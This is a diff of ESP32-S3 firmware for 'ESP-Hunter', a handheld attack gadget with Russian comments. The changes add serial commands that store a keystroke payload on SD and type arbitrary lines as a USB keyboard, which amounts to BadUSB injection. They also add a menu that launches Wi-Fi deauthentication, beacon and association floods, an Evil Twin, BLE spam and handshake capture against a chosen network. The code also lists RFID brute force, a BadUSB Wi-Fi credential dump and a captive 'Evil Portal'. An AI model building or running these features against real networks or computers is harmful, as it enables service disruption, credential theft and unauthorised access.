-      json += "{\"name\":\"" + String(bleScannedList[i].deviceName) + "\",\"mac\":\"" + String(bleScannedList[i].macAddress) + "\",\"rssi\":" + String(bleScannedList[i].signalRssi) + "}";
-    }
-    json += "]";
-    webServer.send(200, "application/json", json);
-  });
-
-  // ========== УПРАВЛЕНИЕ МЫШЬЮ ==========
-  webServer.on("/api/mouse/move", HTTP_GET, []() {
-    int x = webServer.hasArg("x") ? webServer.arg("x").toInt() : 0;
-    int y = webServer.hasArg("y") ? webServer.arg("y").toInt() : 0;
-    if (x != 0 || y != 0) {
-      Mouse.move(x, y);
-    }
-    webServer.send(200, "application/json", "{\"msg\":\"Move " + String(x) + "," + String(y) + "\"}");
-  });
-  webServer.on("/api/mouse/click", HTTP_GET, []() {
-    int btn = webServer.hasArg("button") ? webServer.arg("button").toInt() : 1; // 1=left, 2=middle, 3=right
-    if (btn == 1) { Mouse.click(MOUSE_LEFT); }
-    else if (btn == 2) { Mouse.click(MOUSE_MIDDLE); }
-    else if (btn == 3) { Mouse.click(MOUSE_RIGHT); }
-    webServer.send(200, "application/json", "{\"msg\":\"Click button " + String(btn) + "\"}");
-  });
-  webServer.on("/api/mouse/scroll", HTTP_GET, []() {
-    int delta = webServer.hasArg("delta") ? webServer.arg("delta").toInt() : 0;
-    if (delta != 0) {
-      Mouse.move(0, 0, delta);
-    }
-    webServer.send(200, "application/json", "{\"msg\":\"Scroll delta " + String(delta) + "\"}");
-  });
-
-  webServer.onNotFound([]() {
-    webServer.send(404, "text/plain", "Not Found");
-  });
-}
-
-void runWebServerMode() {
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP(AP_SSID, AP_PASS);
-  setupWebServerRoutes();
-  webServer.begin();
-  isWebServerRunning = true;
-  drawHeaderBar("WEB REMOTE CONTROL");
-  canvas.setTextColor(COLOR_GREEN);
-  canvas.setCursor(5, 25);
-  canvas.print("Wi-Fi AP Active!");
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 42);
-  canvas.printf("SSID: %s", AP_SSID);
-  canvas.setCursor(5, 57);
-  canvas.printf("PASS: %s", AP_PASS);
-  canvas.setTextColor(COLOR_YELLOW);
-  canvas.setCursor(5, 75);
-  canvas.print("Open in Browser:");
-  canvas.setTextColor(COLOR_CYAN);
-  canvas.setCursor(5, 90);
-  canvas.print("http://192.168.4.1");
-  drawFooterBar("Hold ESC to Exit");
-  canvasFlush();
-  while (isWebServerRunning) {
-    webServer.handleClient();
-    processIrRxTask();
-    if (digitalRead(BTN_ESC) == LOW) {
-      delay(100);
-      if (digitalRead(BTN_ESC) == LOW) {
-        isWebServerRunning = false;
-      }
-    }
-    yield();
-  }
-  webServer.stop();
-  WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_OFF);
-  drawHeaderBar("WEB REMOTE");
-  canvas.setTextColor(COLOR_RED);
-  canvas.setCursor(5, 50);
-  canvas.print("Server Stopped!");
-  canvasFlush();
-  delay(800);
-}
-
-// ======================================================================
-// 24. ИНФОРМАЦИОННЫЕ СТРАНИЦЫ
-// ======================================================================
-void drawSdInfoPage() {
-  drawHeaderBar("MICROSD INFO");
-  canvas.setTextSize(1);
-  canvas.setCursor(5, 28);
-  if (isSdCardAvailable) {
-    canvas.setTextColor(COLOR_GREEN);
-    canvas.print("Status: MOUNTED");
-    digitalWrite(TFT_CS, HIGH);
-    digitalWrite(SD_CS, LOW);
-    uint64_t totalSizeMb = SD.cardSize() / (1024 * 1024);
-    digitalWrite(SD_CS, HIGH);
-    canvas.setCursor(5, 45);
-    canvas.setTextColor(COLOR_WHITE);
-    canvas.printf("Size: %u MB", (uint32_t)totalSizeMb);
-    canvas.setCursor(5, 62);
-    canvas.setTextColor(COLOR_YELLOW);
-    canvas.print("Config : /config.txt");
-    canvas.setCursor(5, 78);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.print("Payload: /payload.txt");
-  } else {
-    canvas.setTextColor(COLOR_RED);
-    canvas.print("Status: NOT FOUND");
-  }
-  drawFooterBar("ESC: back");
-  canvasFlush();
-}
-
-void drawAboutSystemPage() {
-  drawHeaderBar("ABOUT SYSTEM");
-  canvas.setTextColor(COLOR_GREEN);
-  canvas.setTextSize(1);
-  canvas.setCursor(5, 28);
-  canvas.print("Board: ESP32-S3");
-  canvas.setCursor(5, 43);
-  canvas.print("LCD: ST7735 128x128");
-  canvas.setCursor(5, 58);
-  canvas.print("USB: HID Keyboard + Mouse");
-  canvas.setCursor(5, 73);
-  canvas.print("Portal: DNS Captive");
-  canvas.setCursor(5, 88);
-  canvas.print("RFID: PN532 I2C");
-  drawFooterBar("ESC: back");
-  canvasFlush();
-}
-
-void drawRemoteStreamStatusPage() {
-  drawHeaderBar("SERIAL REMOTE");
-  canvas.setTextColor(COLOR_GREEN);
-  canvas.setCursor(5, 30);
-  canvas.print("Stream Ready!");
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 50);
-  canvas.print("Use PC Manager app");
-  canvas.setCursor(5, 65);
-  canvas.print("to mirror screen");
-  canvas.setCursor(5, 80);
-  canvas.print("& control via D-Pad.");
-  drawFooterBar("ESC: Back");
-  canvasFlush();
-}
-
-// ======================================================================
-// 25. ОБРАБОТКА КОМАНД ИЗ SERIAL
+// 20. ОБРАБОТКА КОМАНД ИЗ SERIAL
 // ======================================================================
 void sendScreenData() {
   Serial.print("IMG_START\n");
@@ -2876,6 +3538,52 @@ void processSerialCommands() {
   if (!Serial.available()) return;
   String cmd = Serial.readStringUntil('\n');
   cmd.trim();
+
+  // --- Обработка загрузки payload на SD ---
+  static String payloadBuffer = "";
+  
+  if (cmd == "CMD:WRITE_PAYLOAD_START") {
+    payloadBuffer = "";
+    Serial.println("PAYLOAD_START_OK");
+    return;
+  }
+  if (cmd.startsWith("PAYLOAD_LINE:")) {
+    String line = cmd.substring(13);
+    payloadBuffer += line + "\n";
+    return;
+  }
+  if (cmd == "CMD:WRITE_PAYLOAD_END") {
+    if (isSdCardAvailable) {
+      digitalWrite(TFT_CS, HIGH);
+      digitalWrite(SD_CS, LOW);
+      File f = SD.open("/payload.txt", FILE_WRITE);
+      if (f) {
+        f.print(payloadBuffer);
+        f.close();
+        Serial.println("PAYLOAD_SAVED");
+      } else {
+        Serial.println("PAYLOAD_SAVE_FAIL");
+      }
+      digitalWrite(SD_CS, HIGH);
+    } else {
+      Serial.println("SD_NOT_AVAILABLE");
+    }
+    payloadBuffer = "";
+    return;
+  }
+
+  // --- Команда для выполнения строки как HID ---
+  if (cmd.startsWith("CMD:EXECUTE_LINE:")) {
+    String line = cmd.substring(16);
+    if (isUsbHidReady) {
+      Keyboard.print(line);
+      Keyboard.write(KEY_RETURN);
+    }
+    Serial.println("EXECUTED");
+    return;
+  }
+
+  // --- Старые команды ---
   if (!cmd.startsWith("CMD:")) return;
   String command = cmd.substring(4);
   command.trim();
@@ -2893,20 +3601,21 @@ void processSerialCommands() {
 }
 
 // ======================================================================
-// 26. ДИСПЕТЧЕР ЭКРАНОВ
+// 15. RENDER И LOOP (с оптимизациями)
 // ======================================================================
 void renderCurrentActivePage() {
   switch (activeCurrentPage) {
-    case 0: // Display settings
+    case 0: // Display
       if (displaySubPage == 0) drawDisplaySubMenu();
       else if (displaySubPage == 1) drawRotationPage();
       else if (displaySubPage == 2) drawColorPage();
       else if (displaySubPage == 3) drawBrightnessPage();
+      else if (displaySubPage == 4) drawBuzzerPage();
       break;
     case 1: // Pong
       if (gamesCurrentSubPage == 0) resetPongGameState();
       break;
-    case 2: // IR
+    case 2: // IR (Вернули!)
       if (irCurrentSubPage == 0) drawGenericSubMenu("IR HUB", irSubMenuItemsText, IR_MENU_COUNT, irSubMenuIndex, irSubMenuScrollOffset);
       else if (irCurrentSubPage == 1) drawIrConsolePage();
       else if (irCurrentSubPage == 2) runClassicTvBGoneLoop();
@@ -2924,13 +3633,17 @@ void renderCurrentActivePage() {
       else if (rfidCurrentSubPage == 7) bruteForceRfid();
       break;
     case 4: // Wi-Fi
-      if (wirelessCurrentSubPage == 0) drawGenericSubMenu("WIRELESS TOOLS", wirelessSubMenuItemsText, WIRELESS_MENU_COUNT, wirelessSubMenuIndex, wirelessSubMenuScrollOffset);
-      else if (wirelessCurrentSubPage == 1) drawWiFiScanPage();
-      else if (wirelessCurrentSubPage == 2) drawBeaconSpamPage();
-      else if (wirelessCurrentSubPage == 3) drawDeauthPage();
-      else if (wirelessCurrentSubPage == 4) drawBleSpamPage();
-      else if (wirelessCurrentSubPage == 5) drawBleSnifferPage();
-      else if (wirelessCurrentSubPage == 6) executeSdWardrivingLog();
+      if (wirelessCurrentSubPage == 0) {
+        drawGenericSubMenu("WIRELESS TOOLS", wirelessSubMenuItemsText, WIRELESS_MENU_COUNT, wirelessSubMenuIndex, wirelessSubMenuScrollOffset);
+      } else if (wirelessCurrentSubPage == 1) {
+        drawWiFiScanPage();
+      } else if (wifiAttackSubPage == 1) {
+        drawAttackChoiceMenu();
+      } else if (wirelessCurrentSubPage == 9) {
+        drawRadarPage();
+      } else if (wirelessCurrentSubPage == 10) {
+        drawWiFiSettingsPage();
+      }
       break;
     case 5: // SD Card
       drawSdInfoPage();
@@ -2956,52 +3669,58 @@ void renderCurrentActivePage() {
   }
 }
 
-// ======================================================================
-// 27. SETUP (ИНИЦИАЛИЗАЦИЯ)
-// ======================================================================
 void setup() {
-  delay(100);
+  
   Serial.begin(115200);
   Serial.println("\n=== ESP-Hunter START ===");
 
-  Keyboard.begin(); Mouse.begin(); USB.begin(); isUsbHidReady = true; delay(50);
+  Keyboard.begin(); Mouse.begin(); USB.begin(); isUsbHidReady = true; 
+  
+  
 
-  // --- СБРОС ДИСПЛЕЯ (увеличенные задержки) ---
-  pinMode(TFT_RST, OUTPUT);
-  digitalWrite(TFT_RST, HIGH);
-  delay(50);
-  digitalWrite(TFT_RST, LOW);
-  delay(50);
-  digitalWrite(TFT_RST, HIGH);
-  delay(200);
+  
+  
+
+
+  
 
   SPI.begin(TFT_SCLK, SD_MISO, TFT_MOSI, -1);
-  delay(100);
-  tft.initR(INITR_144GREENTAB); // или INITR_BLACKTAB
-  delay(200);
+  
+  tft.initR(INITR_144GREENTAB);
+  
   tft.fillScreen(COLOR_BLACK);
 
-          // Настройка пина яркости (если доступен)
-  pinMode(BACKLIGHT_PIN, OUTPUT);
+      pinMode(BACKLIGHT_PIN, OUTPUT);
   backlightAvailable = true;
   analogWrite(BACKLIGHT_PIN, 128);
-  delay(100);
+
 
   pinMode(SD_CS, OUTPUT);
   digitalWrite(SD_CS, HIGH);
   pinMode(TFT_CS, OUTPUT);
   digitalWrite(TFT_CS, HIGH);
 
+    pinMode(TFT_RST, OUTPUT);
+  digitalWrite(TFT_RST, HIGH);
+  
+  digitalWrite(TFT_RST, LOW);
+  
+  digitalWrite(TFT_RST, HIGH);
+
   tft.fillScreen(COLOR_BLACK);
   tft.setRotation(currentRotation);
   canvas.fillScreen(COLOR_BLACK);
   canvasFlush();
-  delay(100);
+  
 
   pinMode(BTN_UP, INPUT_PULLUP);
   pinMode(BTN_DOWN, INPUT_PULLUP);
   pinMode(BTN_OK, INPUT_PULLUP);
   pinMode(BTN_ESC, INPUT_PULLUP);
+
+  pinMode(BUZZER_PIN, OUTPUT);
+  initBuzzer();
+
 
   pinMode(IR_TX_PIN, OUTPUT);
   digitalWrite(IR_TX_PIN, LOW);
@@ -3010,18 +3729,19 @@ void setup() {
   isIrRxReady = (digitalRead(IR_RX_PIN) == HIGH);
 
   preferences.begin("rfid_store", false);
+  loadSystemSettings();
   irsend.begin();
   irrecv.enableIRIn();
 
   initializeSdCardStorage();
   initializeRfidHardware();
 
-  loadSystemSettings();
-
+  radar.init();
   randomSeed(esp_random());
-  delay(100);
+  
 
   // Заставка
+  
   canvas.fillScreen(COLOR_BLACK);
   canvas.drawRect(2, 2, 124, 124, accentColor);
   canvas.setTextWrap(false);
@@ -3034,19 +3754,17 @@ void setup() {
   canvas.setCursor(10, 110);
   canvas.printf("SD:%s PN532:%s", isSdCardAvailable ? "OK" : "NO", isRfidAvailable ? "OK" : "NO");
   canvasFlush();
+  playSplashMelody();
   delay(3000);
-
+  
   redrawFlag = true;
 }
 
-// ======================================================================
-// 28. LOOP (ГЛАВНЫЙ ЦИКЛ)
-// ======================================================================
-unsigned long lastArcadeGameTick = 0;
-
-
 void loop() {
+  updateBuzzer();
   processSerialCommands();
+
+  // Оптимизация: обновляем кнопки с автоповтором
   updateButton(btnUp, true);
   updateButton(btnDown, true);
   updateButton(btnOk, false);
@@ -3057,11 +3775,18 @@ void loop() {
   bool isOkPressed   = getButtonPress(btnOk);
   bool isEscPressed  = getButtonPress(btnEsc);
 
+
+if (isUpPressed) playBeep(800, 60);
+if (isDownPressed) playBeep(800, 60);
+if (isOkPressed) playBeep(800, 60);
+if (isEscPressed) playBeep(800, 60);
+
+  // IR обработка (не блокирующая)
   processIrRxTask();
 
-  // Фоновые атаки
+  // Фоновые задачи (только если активны)
   if (activeCurrentPage == 4 && wirelessCurrentSubPage == 2) tickBeaconSpamTask();
-  if (activeCurrentPage == 4 && wirelessCurrentSubPage == 3) runDeauthTick();
+  if (activeCurrentPage == 4 && wirelessCurrentSubPage == 1) runDeauthTick();
 
   // Игра Pong
   if (activeCurrentPage == 1 && gamesCurrentSubPage == 0) {
@@ -3074,10 +3799,12 @@ void loop() {
       activeCurrentPage = -1;
       redrawFlag = true;
     }
-    return;
+    return; // чтобы не рисовать меню поверх игры
   }
 
-  if (redrawFlag) {
+  // Ограничение частоты перерисовки (20 кадров/сек)
+  if (redrawFlag && (millis() - lastRedrawTime >= REDRAW_INTERVAL)) {
+    lastRedrawTime = millis();
     renderCurrentActivePage();
     redrawFlag = false;
   }
@@ -3114,12 +3841,12 @@ void loop() {
         savedIrSelected = 0;
         savedIrScroll = 0;
         marqueeOffset = 0;
-        // Для Display
         displaySubPage = 0;
         displaySubMenuIndex = 0;
         displaySubMenuScrollOffset = 0;
+        wifiAttackSubPage = 0;
         redrawFlag = true;
-        if (activeCurrentPage == 2) { // IR
+        if (activeCurrentPage == 2) {
           pinMode(IR_RX_PIN, INPUT);
           irrecv.enableIRIn();
         }
@@ -3127,12 +3854,156 @@ void loop() {
     }
     return;
   }
+  // ===== Обработка страницы Wi-Fi (4) =====
+  if (activeCurrentPage == 4) {
+    if (wirelessCurrentSubPage == 0) {
+      if (isUpPressed) {
+        wirelessSubMenuIndex = (wirelessSubMenuIndex <= 0) ? WIRELESS_MENU_COUNT - 1 : wirelessSubMenuIndex - 1;
+        redrawFlag = true;
+      }
+      if (isDownPressed) {
+        wirelessSubMenuIndex = (wirelessSubMenuIndex >= WIRELESS_MENU_COUNT - 1) ? 0 : wirelessSubMenuIndex + 1;
+        redrawFlag = true;
+      }
+      if (isOkPressed) {
+        if (wirelessSubMenuIndex == 0) {
+          wirelessCurrentSubPage = 1;
+          wifiAttackSubPage = 0;
+          redrawFlag = true;
+        } else if (wirelessSubMenuIndex == 9) {    // Radar Mode
+          wirelessCurrentSubPage = 9;
+          redrawFlag = true;
+        } else if (wirelessSubMenuIndex == 10) {   // Settings
+          wirelessCurrentSubPage = 10;
+          redrawFlag = true;
+        } else {
+          switch (wirelessSubMenuIndex) {
+            case 1: runDeauthAttack(true); break;
+            case 2: runBeaconAttack(false); break;
+            case 3: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runBeaconAttack(true); else showPopup("Select target first"); break;
+            case 4: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runAssocAuthAttack(false); else showPopup("Select target first"); break;
+            case 5: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runAssocAuthAttack(true); else showPopup("Select target first"); break;
+            case 6: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runEvilTwin(); else showPopup("Select target first"); break;
+            case 7: runSourApple(); break;
+            case 8: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) captureHandshake(wifiSelectedIndex); else showPopup("Select target first"); break;
+          }
+          redrawFlag = true;
+        }
+      }
+      if (isEscPressed) {
+        activeCurrentPage = -1;
+        redrawFlag = true;
+        return;
+      }
+    } else if (wirelessCurrentSubPage == 1) {
+      // Страница сканирования Wi-Fi
+      if (isUpPressed && wifiScannedCount > 0) {
+        wifiSelectedIndex = (wifiSelectedIndex <= 0) ? wifiScannedCount - 1 : wifiSelectedIndex - 1;
+        redrawFlag = true;
+      }
+      if (isDownPressed) {
+        if (wifiScannedCount > 0) {
+          wifiSelectedIndex = (wifiSelectedIndex >= wifiScannedCount - 1) ? 0 : wifiSelectedIndex + 1;
+          redrawFlag = true;
+        } else {
+          executeWiFiScan();
+        }
+      }
+      if (isOkPressed && wifiScannedCount > 0) {
+        wifiAttackSubPage = 1;
+        wifiAttackChoice = 0;
+        wifiAttackScroll = 0;
+        redrawFlag = true;
+      }
+      if (isEscPressed) {
+        wirelessCurrentSubPage = 0;
+        redrawFlag = true;
+      }
+    } else if (wifiAttackSubPage == 1) {
+      // Меню выбора атаки для выбранной сети
+      if (isUpPressed) {
+        wifiAttackChoice = (wifiAttackChoice <= 0) ? ATTACK_CHOICE_COUNT - 1 : wifiAttackChoice - 1;
+        redrawFlag = true;
+      }
+      if (isDownPressed) {
+        wifiAttackChoice = (wifiAttackChoice >= ATTACK_CHOICE_COUNT - 1) ? 0 : wifiAttackChoice + 1;
+        redrawFlag = true;
+      }
+      if (isOkPressed) {
+        switch (wifiAttackChoice) {
+          case 0: runDeauthAttack(false); break;
+          case 1: runBeaconAttack(false); break;
+          case 2: runBeaconAttack(true); break;
+          case 3: runAssocAuthAttack(false); break;
+          case 4: runAssocAuthAttack(true); break;
+          case 5: runEvilTwin(); break;
+          case 6: runSourApple(); break;
+          case 7: captureHandshake(wifiSelectedIndex); break;
+        }
+        wifiAttackSubPage = 0;
+        wirelessCurrentSubPage = 1;
+        redrawFlag = true;
+      }
+      if (isEscPressed) {
+        wifiAttackSubPage = 0;
+        wirelessCurrentSubPage = 1;
+        redrawFlag = true;
+      }
+    } else if (wirelessCurrentSubPage == 9) {   // Radar Mode
+      // Функция drawRadarPage() сама закроет цикл и вернёт управление, 
+      // но после выхода нужно сбросить флаги
+      drawRadarPage();
+      wirelessCurrentSubPage = 0;
+      wifiAttackSubPage = 0;
+      redrawFlag = true;
+    } else if (wirelessCurrentSubPage == 10) {  // Settings
+      if (isUpPressed) {
+        if (wifiEditValue) {
+          int* ptr = nullptr;
+          switch (wifiSettingsSelected) {
+            case 0: ptr = &framesPerDeauth; break;
+            case 1: ptr = &sendDelay; break;
+            case 2: ptr = &framesPerBeacon; break;
+            case 3: ptr = &maxClone; break;
+            case 4: ptr = &maxSpamSpace; break;
+          }
+          if (ptr) (*ptr)++;
+        } else {
+          wifiSettingsSelected = (wifiSettingsSelected <= 0) ? 4 : wifiSettingsSelected - 1;
+        }
+        redrawFlag = true;
+      }
+      if (isDownPressed) {
+        if (wifiEditValue) {
+          int* ptr = nullptr;
+          switch (wifiSettingsSelected) {
+            case 0: ptr = &framesPerDeauth; break;
+            case 1: ptr = &sendDelay; break;
+            case 2: ptr = &framesPerBeacon; break;
+            case 3: ptr = &maxClone; break;
+            case 4: ptr = &maxSpamSpace; break;
+          }
+          if (ptr && *ptr > 0) (*ptr)--;
+        } else {
+          wifiSettingsSelected = (wifiSettingsSelected >= 4) ? 0 : wifiSettingsSelected + 1;
+        }
+        redrawFlag = true;
+      }
+      if (isOkPressed) {
+        wifiEditValue = !wifiEditValue;
+        redrawFlag = true;
+      }
+      if (isEscPressed) {
+        wirelessCurrentSubPage = 0;
+        wifiEditValue = false;
+        redrawFlag = true;
+      }
+    }
+  } // <-- ЗАКРЫТИЕ if (activeCurrentPage == 4)
 
-  // ---- ОБРАБОТКА СТРАНИЦ ----
-
-  // Страница 0 – Display Settings
+  // Обработка страницы Display (0)
   if (activeCurrentPage == 0) {
-    if (displaySubPage == 0) { // Подменю
+    if (displaySubPage == 0) {
       if (isUpPressed) {
         displaySubMenuIndex = (displaySubMenuIndex <= 0) ? DISPLAY_SUB_MENU_COUNT - 1 : displaySubMenuIndex - 1;
         redrawFlag = true;
@@ -3142,7 +4013,7 @@ void loop() {
         redrawFlag = true;
       }
       if (isOkPressed) {
-        displaySubPage = displaySubMenuIndex + 1; // 1-Rotation, 2-Color, 3-Brightness
+        displaySubPage = displaySubMenuIndex + 1;
         redrawFlag = true;
       }
       if (isEscPressed) {
@@ -3150,7 +4021,7 @@ void loop() {
         redrawFlag = true;
         return;
       }
-    } else if (displaySubPage == 1) { // Rotation
+    } else if (displaySubPage == 1) {
       if (isUpPressed) {
         currentRotation = (currentRotation + 1) % 4;
         applyRotation(currentRotation);
@@ -3167,13 +4038,12 @@ void loop() {
         redrawFlag = true;
       }
       if (isEscPressed) {
-        // Отмена – восстанавливаем сохранённое значение
         applyRotation(preferences.getUChar("rotation", 0));
         currentRotation = preferences.getUChar("rotation", 0);
         displaySubPage = 0;
         redrawFlag = true;
       }
-    } else if (displaySubPage == 2) { // Color
+    } else if (displaySubPage == 2) {
       if (isUpPressed) {
         selectedColorIndex = (selectedColorIndex + 1) % COLOR_COUNT;
         accentColor = colorValuesList[selectedColorIndex];
@@ -3193,22 +4063,23 @@ void loop() {
         selectedColorIndex = preferences.getUChar("colorIdx", 1) % COLOR_COUNT;
         accentColor = colorValuesList[selectedColorIndex];
         displaySubPage = 0;
+        redrawFlag = true;
       }
-    } else if (displaySubPage == 3) { // Brightness
+    } else if (displaySubPage == 3) {
       if (isUpPressed) {
-  if (backlightBrightness < 255) backlightBrightness += 5;
-  if (backlightBrightness > 255) backlightBrightness = 255;
-  setBacklight(backlightBrightness);
-  saveSystemSettings();   // <-- добавьте эту строку
-  redrawFlag = true;
-}
-if (isDownPressed) {
-  if (backlightBrightness > 5) backlightBrightness -= 5;
-  else backlightBrightness = 0;
-  setBacklight(backlightBrightness);
-  saveSystemSettings();   // <-- и здесь
-  redrawFlag = true;
-}
+        if (backlightBrightness < 255) backlightBrightness += 5;
+        if (backlightBrightness > 255) backlightBrightness = 255;
+        setBacklight(backlightBrightness);
+        saveSystemSettings();
+        redrawFlag = true;
+      }
+      if (isDownPressed) {
+        if (backlightBrightness > 5) backlightBrightness -= 5;
+        else backlightBrightness = 0;
+        setBacklight(backlightBrightness);
+        saveSystemSettings();
+        redrawFlag = true;
+      }
       if (isOkPressed) {
         saveSystemSettings();
         displaySubPage = 0;
@@ -3221,12 +4092,37 @@ if (isDownPressed) {
         redrawFlag = true;
       }
     }
-    return;
+               else if (displaySubPage == 4) {
+  if (isUpPressed) {
+    if (buzzerVolume < 255) buzzerVolume += 15;
+    if (buzzerVolume > 255) buzzerVolume = 255;
+    if (buzzerEnabled && buzzerVolume > 0) playBeep(1500, 30, buzzerVolume);
+    redrawFlag = true;
   }
+  if (isDownPressed) {
+    if (buzzerVolume > 0) buzzerVolume -= 15;
+    else buzzerVolume = 0;
+    if (buzzerEnabled && buzzerVolume > 0) playBeep(1500, 30, buzzerVolume);
+    redrawFlag = true;
+  }
+  if (isOkPressed) {
+    buzzerEnabled = !buzzerEnabled;
+    // Если только что включили - принудительно пикаем максимально громко
+    if (buzzerEnabled) playBeep(2000, 100, 255); 
+    redrawFlag = true;
+  }
+  if (isEscPressed) {
+    saveSystemSettings();
+    displaySubPage = 0;
+    redrawFlag = true;
+  }
+}
+    
 
-  // Страница 1 – Pong (обработана ранее)
-
-  // Страница 2 – IR
+    if (isEscPressed) { activeCurrentPage = -1; redrawFlag = true; return; }
+    return;
+  } 
+  // Обработка страницы IR (2)
   if (activeCurrentPage == 2) {
     if (irCurrentSubPage == 0) {
       if (isUpPressed) {
@@ -3271,8 +4167,10 @@ if (isDownPressed) {
       return;
     }
   }
+    
+  
 
-  // Страница 3 – RFID (без изменений)
+  // Обработка страницы RFID (3)
   if (activeCurrentPage == 3) {
     if (rfidCurrentSubPage == 0) {
       if (isUpPressed) {
@@ -3350,84 +4248,7 @@ if (isDownPressed) {
     }
   }
 
-  // Страница 4 – Wi-Fi (без изменений)
-  if (activeCurrentPage == 4) {
-    if (wirelessCurrentSubPage == 0) {
-      if (isUpPressed) {
-        wirelessSubMenuIndex = (wirelessSubMenuIndex <= 0) ? WIRELESS_MENU_COUNT - 1 : wirelessSubMenuIndex - 1;
-        redrawFlag = true;
-      }
-      if (isDownPressed) {
-        wirelessSubMenuIndex = (wirelessSubMenuIndex >= WIRELESS_MENU_COUNT - 1) ? 0 : wirelessSubMenuIndex + 1;
-        redrawFlag = true;
-      }
-      if (isOkPressed) {
-        if (wirelessSubMenuIndex == 6) executeSdWardrivingLog();
-        else {
-          wirelessCurrentSubPage = wirelessSubMenuIndex + 1;
-          redrawFlag = true;
-        }
-      }
-    } else if (wirelessCurrentSubPage == 1) {
-      if (isUpPressed && wifiScannedCount > 0) {
-        wifiSelectedIndex = (wifiSelectedIndex <= 0) ? wifiScannedCount - 1 : wifiSelectedIndex - 1;
-        redrawFlag = true;
-      }
-      if (isDownPressed) {
-        if (wifiScannedCount > 0) {
-          wifiSelectedIndex = (wifiSelectedIndex >= wifiScannedCount - 1) ? 0 : wifiSelectedIndex + 1;
-          redrawFlag = true;
-        } else {
-          executeWiFiScan();
-        }
-      }
-      if (isOkPressed) executeWiFiScan();
-    } else if (wirelessCurrentSubPage == 2) {
-      if (isOkPressed) {
-        isBeaconSpamActive = !isBeaconSpamActive;
-        if (isBeaconSpamActive) WiFi.mode(WIFI_AP);
-        else WiFi.mode(WIFI_OFF);
-        redrawFlag = true;
-      }
-    } else if (wirelessCurrentSubPage == 3) {
-      if (isOkPressed) {
-        deauthActive = !deauthActive;
-        if (deauthActive) {
-          WiFi.mode(WIFI_STA);
-          esp_wifi_set_promiscuous(true);
-          esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
-        } else {
-          esp_wifi_set_promiscuous(false);
-          WiFi.mode(WIFI_OFF);
-        }
-        redrawFlag = true;
-      }
-    } else if (wirelessCurrentSubPage == 4) {
-      if (isOkPressed) {
-        isBleSpamActive = !isBleSpamActive;
-        if (isBleSpamActive) startBleSpamAttack();
-        else stopBleSpamAttack();
-        redrawFlag = true;
-      }
-    } else if (wirelessCurrentSubPage == 5) {
-      if (isOkPressed) runBleSnifferScan();
-    }
-    if (isEscPressed) {
-      if (isBeaconSpamActive) { isBeaconSpamActive = false; WiFi.mode(WIFI_OFF); }
-      if (deauthActive) { deauthActive = false; esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_OFF); }
-      if (isBleSpamActive) { isBleSpamActive = false; stopBleSpamAttack(); }
-      if (wirelessCurrentSubPage > 0) {
-        wirelessCurrentSubPage = 0;
-        redrawFlag = true;
-      } else {
-        activeCurrentPage = -1;
-        redrawFlag = true;
-      }
-      return;
-    }
-  }
-
-  // Страница 7 – BadUSB (без изменений)
+  // Обработка страницы BadUSB (7)
   if (activeCurrentPage == 7) {
     if (badUsbCurrentSubPage == 0) {
       if (isUpPressed) {
@@ -3452,6 +4273,7 @@ if (isDownPressed) {
           case 7: runBadUsbDumpWifi(); break;
           case 8: ensureEnglishLayout(); break;
         }
+        redrawFlag = true;
       }
     }
     if (isEscPressed) {
@@ -3461,7 +4283,7 @@ if (isDownPressed) {
     }
   }
 
-  // Страница 8 – Evil Portal (без изменений)
+  // Обработка страницы Evil Portal (8)
   if (activeCurrentPage == 8) {
     if (evilPortalCurrentSubPage == 0) {
       if (isUpPressed) {
@@ -3532,13 +4354,16 @@ if (isDownPressed) {
     }
   }
 
-  // Если ESC на странице, где не обработано – возврат в главное меню
+  
+
+  // Обработка страниц SD, About, Web Remote и т.д. (возврат по ESC)
   if (isEscPressed && activeCurrentPage != 0 && activeCurrentPage != 1 &&
       activeCurrentPage != 2 && activeCurrentPage != 3 &&
-      activeCurrentPage != 4 && activeCurrentPage != 7 && activeCurrentPage != 8) {
+      activeCurrentPage != 4 && activeCurrentPage != 7 && activeCurrentPage != 8 && activeCurrentPage != 10) {
     activeCurrentPage = -1;
     redrawFlag = true;
   }
 
-  yield();
+   yield();
+  updateBuzzer(); 
 }
